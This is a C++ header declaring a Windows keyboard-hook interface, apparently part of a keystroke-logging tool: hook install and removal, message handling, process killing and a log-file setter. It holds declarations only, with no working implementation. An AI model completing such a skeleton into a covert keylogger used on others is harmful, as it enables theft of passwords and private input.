#ifndef ENIGMA__KEYHOOK_H_
#define ENIGMA__KEYHOOK_H_

#include <iostream>

#include <Windows.h>

#include "keyconst.h"
#include "stream.h"

namespace KeyHook {
LRESULT RunHook(int nCode, WPARAM wParam, LPARAM lParam);
bool InstallHook();
bool UninstallHook();
void HandleMessage(bool logMsg);
bool KillProcess();
void SetLogFile(Stream::LogFile *file);

static int activeProcess = 0x0;
}

#endif //ENIGMA__KEYHOOK_H_
